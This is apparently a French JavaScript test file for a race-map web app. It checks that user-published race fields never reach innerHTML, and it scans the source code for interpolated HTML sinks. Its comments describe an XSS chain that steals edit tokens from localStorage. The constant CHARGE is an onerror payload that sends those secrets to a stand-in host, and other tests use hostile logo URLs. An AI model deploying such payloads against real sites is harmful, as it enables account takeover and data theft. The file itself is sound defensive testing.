// LA DONNÉE DE COURSE NE DOIT JAMAIS DEVENIR DU HTML — où qu'elle aille.
//
// ═══════════════════════════════════════════════════════════════════════════
// POURQUOI CE TEST EXISTE, ET POURQUOI IL NE PORTE PAS SUR UN FICHIER
// ═══════════════════════════════════════════════════════════════════════════
// Le même bug avait DÉJÀ été trouvé, corrigé et verrouillé — mais dans UN
// fichier (src/ui/carnet-course.js), par un test qui lit CE fichier
// (test/course-bar.test.js). Le voisin, src/race-labels.js, qui lit exactement
// la même donnée et la rendait dans trois gabarits `innerHTML`, est resté
// troué tout ce temps. Un test par fichier ne protège que le fichier qu'il
// nomme ; la faille, elle, appartient à la DONNÉE.
//
// La donnée en question : le contenu d'un lien /r/<id>. N'importe qui peut en
// publier un (netlify/functions/race.mjs n'inspecte que le type et la taille
// de `body.race`), et le lien est fait pour être envoyé à des inconnus. La
// chaîne complète :
//   1. je publie une course dont le NOM est
//      `<img src=x onerror=…>` — le nom SEUL suffit, main.js pousse le
//      cartouche de départ dès que `raceState.name` est non vide, aucun point
//      de passage n'est nécessaire ;
//   2. j'envoie le lien ;
//   3. le script s'exécute sur l'origine shibumap.com, chez le destinataire ;
//   4. il lit `localStorage['shibumap.race.secrets']` (share-link.js) — jusqu'à
//      50 jetons d'édition d'autres courses publiées depuis ce navigateur ;
//   5. il réécrit par PUT parfaitement légitime les parcours d'autrui.
// Aucun CSP ne rattrape : index.html n'en porte aucun, public/_headers ne
// contient que des règles de cache.
//
// Ce fichier vérifie donc DEUX choses, dans cet ordre :
//   · le COMPORTEMENT, en exécutant le vrai code de rendu des cartouches sur
//     un payload hostile (harnais DOM minimal ci-dessous : race-labels.js
//     n'est pas importable en node, il tire three.js et une feuille .css) ;
//   · le BALAYAGE : aucun consommateur de `name` / `logo` / `cutoff` /
//     `waypoints` ne les interpole dans du HTML. La liste des consommateurs
//     est en partie DÉTECTÉE, pour que le prochain fichier qui touchera à
//     cette donnée soit pris tout seul.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { parseRace, LOGO_DATA_URL_RE } from '../src/race-model.js'

const RACINE = path.join(path.dirname(fileURLToPath(import.meta.url)), '..')
const lire = (p) => fs.readFileSync(path.join(RACINE, p), 'utf8')

// ⚠️ LES COMMENTAIRES SONT DE LA PROSE, PAS DU CODE (même piège que
// test/course-bar.test.js). Ce dépôt CITE le code fautif d'avant dans ses
// commentaires — scanner la source sans les retirer, c'est faire échouer un
// test sur la description du bug qu'il vérifie être corrigé.
const codeSeul = (src) => src
  .replace(/\/\*[\s\S]*?\*\//g, '')
  .replace(/(^|[^:'"`])\/\/.*$/gm, '$1')

const CHARGE = '<img src=x onerror=fetch("//moi/"+localStorage.getItem("shibumap.race.secrets"))>'
const LOGO_VALIDE = 'data:image/png;base64,iVBORw0KGgo='

// ═══════════════════════════════════════════ harnais DOM minimal
// De quoi exécuter POUR DE VRAI src/race-labels.js hors navigateur. Il ne
// simule que ce que le module touche — et surtout il TIENT UN JOURNAL de tout
// ce qui est écrit en `innerHTML` : c'est là que la charge apparaîtrait.
function harnais() {
  const journalHtml = []
  const creer = (tag) => {
    const n = {
      tag,
      className: '',
      style: {},
      childNodes: [],
      offsetWidth: 40,
      classList: { add() {}, remove() {}, toggle() {}, contains: () => false },
      addEventListener() {},
      // le harnais ne PARSE pas le HTML : un sélecteur qui ne trouve rien rend
      // un nœud muet plutôt que null. C'est volontaire — la version FAUTIVE du
      // module (qui posait son gabarit en innerHTML puis retrouvait sa croix
      // par querySelector) doit s'exécuter jusqu'au bout et se faire prendre
      // sur la charge, pas mourir sur une lacune du harnais.
      querySelector(sel) {
        const cls = sel.replace(/^\./, '')
        return n.childNodes.find((c) => (c.className || '').split(' ').includes(cls))
          || { addEventListener() {}, className: '', childNodes: [] }
      },
      appendChild(c) { n.childNodes.push(c); return c },
      append(...cs) { for (const c of cs) n.childNodes.push(c) },
      remove() {},
      getBoundingClientRect: () => ({ left: 0, top: 0, right: 0, bottom: 0, width: 0, height: 0 }),
      get textContent() { return n.childNodes.map((c) => c.textContent ?? '').join('') },
      set textContent(v) { n.childNodes = [{ tag: '#texte', textContent: String(v), childNodes: [] }] },
      set innerHTML(v) {
        journalHtml.push(String(v))
        // on ne PARSE pas : un nœud « brut » suffit, et il rend visible dans
        // l'arbre tout ce qui a été inséré en HTML plutôt qu'en texte
        const brut = { tag: '#brut', brut: String(v), textContent: '', childNodes: [] }
        n.childNodes = [brut]
        if (tag === 'template') n.content = { childNodes: [brut] }
      },
    }
    if (tag === 'template') n.content = { childNodes: [] }
    return n
  }
  const document = { createElement: creer, querySelector: () => null }
  class Vector3 {
    constructor() { this.x = 0; this.y = 0; this.z = 0 }
    set(x, y, z) { this.x = x; this.y = y; this.z = z; return this }
    project() { return this }
  }
  // le module est chargé par sa SOURCE, imports retirés : `three` coûterait
  // une dépendance lourde pour un Vector3, et node ne sait pas lire un .css
  const src = lire('src/race-labels.js')
    .replace(/^import[^\n]*\n/gm, '')
    .replace(/^export /gm, '')
  const fab = new Function('THREE', 'document', 'window', `${src}\n;return { buildRaceLabels, PICTOS }`)
  const { buildRaceLabels, PICTOS } = fab({ Vector3 }, document, {})
  return { buildRaceLabels, PICTOS, journalHtml, creer }
}

// pose les items et rend l'arbre à plat : textes, HTML brut, éléments
function poseCartouches(items) {
  const h = harnais()
  const container = h.creer('div')
  container.clientWidth = 1200
  container.clientHeight = 800
  const ctl = h.buildRaceLabels({
    container,
    camera: {},
    params: { gpxCartouches: true },
    getItems: () => items,
  })
  ctl.update()
  const textes = []
  const bruts = []
  const elements = []
  const parcours = (n) => {
    if (n.tag === '#texte') textes.push(n.textContent)
    else if (n.tag === '#brut') bruts.push(n.brut)
    else elements.push(n)
    for (const c of n.childNodes || []) parcours(c)
  }
  for (const n of ctl._nodes.values()) parcours(n.cart)
  return { textes, bruts, elements, journalHtml: h.journalHtml, PICTOS: h.PICTOS, nodes: ctl._nodes }
}

// la forme EXACTE que main.js (getItems) pousse dans les cartouches à partir
// d'un `race` sorti de parseRace — reproduite ici pour que le test parte du
// payload publié, pas d'un objet inventé
const itemsDepuisRace = (race) => [
  { id: 'race_start', kind: 'start', world: { x: 0, y: 0, z: 0 }, word: 'START', name: race.name, logo: race.logo, totalKm: 42, pictos: race.waypoints[0]?.pictos || [] },
  ...race.waypoints.map((w, i) => ({ id: `wp_${i}`, kind: 'waypoint', world: { x: 0, y: 0, z: 0 }, km: w.km, name: w.name, alt: w.alt, cutoff: w.cutoff, pictos: w.pictos })),
  { id: 'poi_1', kind: 'transport', world: { x: 0, y: 0, z: 0 }, name: race.name, pictos: ['gare'] },
]

const payloadHostile = (logo = CHARGE) => parseRace(JSON.stringify({
  format: 'shibumap-race',
  version: 1,
  race: {
    name: CHARGE,
    logo,
    waypoints: [{ km: 12.4, name: CHARGE, alt: 900, pictos: ['eau'], cutoff: CHARGE }],
  },
})).race

// ═══════════════════════════════════════════ 1. la donnée, champ par champ
test('AUCUN champ d’une course publiée n’atteint un innerHTML', () => {
  const race = payloadHostile()
  const { journalHtml, bruts, textes, elements } = poseCartouches(itemsDepuisRace(race))

  // LE point du test : tout ce qui a été écrit en HTML doit être une constante
  // du dépôt (les pictos, des <svg> de PICTOS) — rien d'autre.
  for (const html of journalHtml) {
    assert.ok(html.startsWith('<svg '), `HTML non constant écrit dans le DOM : ${html.slice(0, 60)}`)
  }
  for (const brut of bruts) assert.ok(brut.startsWith('<svg '))
  // et la charge n'apparaît nulle part en HTML, sous aucune forme
  const tout = [...journalHtml, ...bruts].join('\n')
  assert.ok(!tout.includes('onerror'), 'la charge est passée par un innerHTML')
  assert.ok(!tout.includes('shibumap.race.secrets'))
  // aucun <img> n'a pu naître de la charge : le seul <img> possible est le
  // logo, et un logo hostile a été refusé en amont (voir le test suivant)
  assert.equal(elements.filter((e) => e.tag === 'img').length, 0)
})

test('un nom hostile ressort en TEXTE VISIBLE, jamais en élément', () => {
  const race = payloadHostile()
  const { textes } = poseCartouches(itemsDepuisRace(race))
  // le nom se LIT tel quel — c'est la bonne issue : l'organisateur voit ce
  // qu'il a saisi, le navigateur ne l'exécute pas
  assert.ok(textes.includes(CHARGE), 'le nom de course doit être posé en texte')
  // le nom du point de passage aussi, et la barrière horaire est un champ
  // libre de plus (String(r.cutoff) côté modèle) : elle passe par la
  // sous-ligne du cartouche
  assert.equal(textes.filter((t) => t === CHARGE).length >= 2, true)
  assert.ok(textes.some((t) => t.includes('barrière ') && t.includes(CHARGE)))
})

test('le logo d’une course publiée est filtré comme celui de premier niveau', () => {
  // src/ground-info-layer.js fait `img.src = r.logo` : une URL distante
  // choisie par un tiers fait fuiter l'IP, l'agent et le référent de CHAQUE
  // destinataire du lien, sans un clic. `String(r.name || '')` n'échappait
  // rien et le logo n'était pas validé DU TOUT, alors que le logo de premier
  // niveau passait déjà par la même allowlist (share-link.js).
  assert.equal(payloadHostile('https://moi.example/pixel.gif').logo, null)
  assert.equal(payloadHostile('javascript:alert(1)').logo, null)
  assert.equal(payloadHostile('data:image/svg+xml;base64,AAAA').logo, null, 'le SVG reste refusé')
  assert.equal(payloadHostile('data:image/png;base64,AA"onerror="x').logo, null)
  assert.equal(payloadHostile(CHARGE).logo, null)
  // et un vrai logo passe toujours — la validation ne casse pas l'usage
  assert.equal(payloadHostile(LOGO_VALIDE).logo, LOGO_VALIDE)
  // une seule allowlist pour les deux portes : share-link.js importe celle-ci
  assert.ok(LOGO_DATA_URL_RE.test(LOGO_VALIDE))
  assert.match(codeSeul(lire('src/share-link.js')), /import \{[^}]*LOGO_DATA_URL_RE[^}]*\} from '\.\/race-model\.js'/)
  assert.ok(!/const LOGO_DATA_URL_RE\s*=/.test(codeSeul(lire('src/share-link.js'))), 'deuxième copie de l’allowlist')
})

test('un logo valide est posé par propriété, jamais par attribut interpolé', () => {
  const race = payloadHostile(LOGO_VALIDE)
  const { elements, journalHtml } = poseCartouches(itemsDepuisRace(race))
  const img = elements.find((e) => e.tag === 'img')
  assert.ok(img, 'le logo doit toujours s’afficher')
  assert.equal(img.src, LOGO_VALIDE)
  assert.equal(img.className, 'rl-start-logo')
  assert.ok(!journalHtml.some((h) => h.includes('<img')))
})

// ═══════════════════════════════════════════ 2. la clé de picto, l'autre donnée tierce
test('une clé de picto inconnue ne rend rien (garde de propriété, pas `|| ""`)', () => {
  // parseRace force les pictos en chaînes mais n'en valide pas le contenu, et
  // Object.freeze ne coupe pas la chaîne de prototypes : `PICTOS['constructor']`
  // rendait une FONCTION, truthy, donc un innerHTML « function Object() {
  // [native code] } ». Même correction que src/ui/carnet-course.js.
  const { journalHtml, bruts } = poseCartouches([
    { id: 'a', kind: 'start', world: { x: 0, y: 0, z: 0 }, name: 'X', totalKm: 1, pictos: ['constructor', 'toString', '__proto__'] },
    { id: 'b', kind: 'waypoint', world: { x: 0, y: 0, z: 0 }, km: 1, name: 'Y', pictos: ['hasOwnProperty'] },
  ])
  for (const h of [...journalHtml, ...bruts]) {
    assert.ok(!/function|native code/.test(h), `une clé de prototype a rendu du code : ${h.slice(0, 60)}`)
  }
})

test('le chip transport garde son picto par défaut quand la clé est inconnue', () => {
  const { bruts } = poseCartouches([
    { id: 'p', kind: 'transport', world: { x: 0, y: 0, z: 0 }, name: 'Gare', pictos: ['constructor'] },
  ])
  assert.equal(bruts.length, 1, 'un et un seul picto : le repli bus')
  assert.ok(bruts[0].startsWith('<svg '))
})

// ═══════════════════════════════════════════ 3. le rendu ne doit pas casser
test('les trois cartouches gardent leur mise en forme après passage en DOM', () => {
  // Le correctif remplace trois gabarits HTML par des createElement : si une
  // classe saute, la feuille race-labels.css ne s'applique plus et le
  // cartouche devient un tas de texte nu. C'est le risque N°1 de ce genre de
  // réécriture — il se teste.
  const { elements } = poseCartouches([
    { id: 'race_start', kind: 'start', world: { x: 0, y: 0, z: 0 }, word: 'START / FINISH', name: 'Transju', logo: LOGO_VALIDE, totalKm: 76, pictos: ['eau', 'ravito'] },
    { id: 'wp_1', kind: 'waypoint', world: { x: 0, y: 0, z: 0 }, km: 12.4, name: 'Col', alt: 1240, cutoff: '12:30', pictos: ['col'] },
    { id: 'poi_1', kind: 'transport', world: { x: 0, y: 0, z: 0 }, name: 'Gare', pictos: ['gare'] },
  ])
  const classes = elements.map((e) => e.className)
  for (const c of ['rl-cart rl-start', 'rl-start-logo', 'rl-start-main', 'rl-start-name', 'rl-start-word', 'rl-start-km', 'rl-cart', 'rl-km', 'rl-name', 'rl-picto', 'rl-sub', 'rl-chip', 'rl-x']) {
    assert.ok(classes.includes(c), `classe perdue dans le passage en DOM : ${c}`)
  }
  // les textes composés restent identiques au gabarit d'avant
  const { textes } = poseCartouches([
    { id: 'race_start', kind: 'start', world: { x: 0, y: 0, z: 0 }, word: 'START / FINISH', name: 'Transju', totalKm: 76, pictos: [] },
    { id: 'wp_1', kind: 'waypoint', world: { x: 0, y: 0, z: 0 }, km: 12.4, name: 'Col', alt: 1240, cutoff: '12:30', pictos: [] },
    { id: 'wp_2', kind: 'waypoint', world: { x: 0, y: 0, z: 0 }, km: 30, name: '', alt: null, pictos: [] },
  ])
  assert.ok(textes.includes('76 KM'))
  assert.ok(textes.includes('START / FINISH'))
  assert.ok(textes.includes('12.4'), 'le km garde une décimale quand il en a une')
  assert.ok(textes.includes('30'), 'et aucune quand il n’en a pas')
  assert.ok(textes.includes('1240 m · barrière 12:30'))
  assert.ok(textes.includes('—'), 'un point sans nom garde son tiret')
})

// ═══════════════════════════════════════════ 4. le balayage : les consommateurs
// Ce qui suit est la partie qui n'aurait PAS pu manquer race-labels.js : elle
// ne nomme pas un fichier, elle cherche la donnée.
const CHAMPS = /(^|[^\w$.])(name|logo|cutoff|waypoints)\b|\.(name|logo|cutoff|waypoints)\b/
// Les marqueurs d'un fichier qui manipule une course. La DÉTECTION est ce qui
// attrapera le prochain consommateur ; la liste explicite en dessous garantit
// la couverture d'aujourd'hui même si un marqueur disparaît d'un fichier.
const MARQUEURS = /raceState|parseRace|\brace\.(name|logo|waypoints)\b|draft\.race|setRace\s*\(|\bwaypoints\b|\bcutoff\b|\bPICTOS\b|raceLabels/
const RENDUS_CONNUS = [
  'src/race-labels.js',
  'src/ui/carnet-course.js',
  'src/ui/course-bar.js',
  'src/ui/studio.js',
  'src/ground-info-layer.js',
  'src/main.js',
]

function fichiersJs(dir, out = []) {
  for (const e of fs.readdirSync(path.join(RACINE, dir), { withFileTypes: true })) {
    const rel = `${dir}/${e.name}`
    if (e.isDirectory()) fichiersJs(rel, out)
    else if (e.name.endsWith('.js')) out.push(rel)
  }
  return out
}

// L'expression à droite d'un `=` (ou le premier argument d'un appel) : on la
// lit caractère par caractère pour suivre les gabarits multilignes, les `${}`
// imbriqués et les chaînes — une regex ne sait pas faire ça.
function expression(src, i) {
  const pile = []
  let d = 0
  let j = i
  while (j < src.length) {
    const c = src[j]
    const haut = pile[pile.length - 1]
    if (haut === '`') {
      if (c === '\\') { j += 2; continue }
      if (c === '`') pile.pop()
      else if (c === '$' && src[j + 1] === '{') { pile.push('{'); d++; j += 2; continue }
    } else if (haut === "'" || haut === '"') {
      if (c === '\\') { j += 2; continue }
      if (c === haut) pile.pop()
    } else if (c === '`' || c === "'" || c === '"') pile.push(c)
    else if (c === '(' || c === '[' || c === '{') { pile.push(c); d++ }
    else if (c === ')' || c === ']' || c === '}') { pile.pop(); d--; if (d < 0) break }
    else if (d === 0 && (c === ';' || c === '\n')) break
    j++
  }
  return src.slice(i, j)
}

// tout ce qui est INTERPOLÉ dans l'expression — ou l'expression entière si
// elle n'est pas un littéral (`el.innerHTML = item.name`)
function interpolations(expr) {
  const out = []
  for (let i = 0; i < expr.length - 1; i++) {
    if (expr[i] === '$' && expr[i + 1] === '{') {
      let d = 1
      let j = i + 2
      while (j < expr.length && d > 0) {
        if (expr[j] === '{') d++
        else if (expr[j] === '}') d--
        j++
      }
      out.push(expr.slice(i + 2, j - 1))
      i = j - 1
    }
  }
  if (!out.length && !/^[`'"]/.test(expr.trim())) out.push(expr.trim())
  return out
}

function fuitesHtml(rel) {
  const src = codeSeul(lire(rel))
  const trouve = []
  const sinks = [
    [/\.(innerHTML|outerHTML)\s*=\s*/g, 'innerHTML'],
    [/insertAdjacentHTML\s*\(/g, 'insertAdjacentHTML'],
    [/document\.write\s*\(/g, 'document.write'],
  ]
  for (const [re, nom] of sinks) {
    for (const m of src.matchAll(re)) {
      for (const x of interpolations(expression(src, m.index + m[0].length))) {
        if (CHAMPS.test(x)) trouve.push(`${rel} — ${nom} interpole « ${x.trim().slice(0, 80)} »`)
      }
    }
  }
  return trouve
}

test('aucun consommateur de la course n’interpole ses champs dans du HTML', () => {
  const detectes = fichiersJs('src').filter((f) => MARQUEURS.test(codeSeul(lire(f))))
  const balayes = [...new Set([...RENDUS_CONNUS, ...detectes])]
  // le balayage doit VOIR les rendus connus : s'il n'en voit plus un, c'est
  // qu'un fichier a été renommé — et le test doit le dire, pas devenir vide
  for (const f of RENDUS_CONNUS) {
    assert.ok(fs.existsSync(path.join(RACINE, f)), `rendu de course introuvable : ${f} (renommé ?)`)
  }
  assert.ok(balayes.length >= RENDUS_CONNUS.length + 2, 'la détection ne trouve plus rien')
  const fuites = balayes.flatMap(fuitesHtml)
  assert.deepEqual(fuites, [], `champ de course interpolé dans du HTML :\n${fuites.join('\n')}`)
})

test('les cartouches de course ne construisent plus aucun HTML sauf les pictos', () => {
  // Verrou de SOURCE en plus du verrou de comportement : il tient même le jour
  // où quelqu'un ajoute un gabarit sans passer par les items ci-dessus.
  const src = codeSeul(lire('src/race-labels.js'))
  for (const m of src.matchAll(/\.innerHTML\s*=\s*([^\n]+)/g)) {
    assert.match(m[1].trim(), /^PICTOS\[/, `innerHTML non constant : ${m[1].trim()}`)
  }
  assert.ok(/Object\.hasOwn\(PICTOS/.test(src), 'la clé de picto doit rester gardée par Object.hasOwn')
  assert.ok(!/<span[^>]*\$\{/.test(src) && !/<img[^>]*\$\{/.test(src), 'gabarit HTML interpolé dans les cartouches')
})
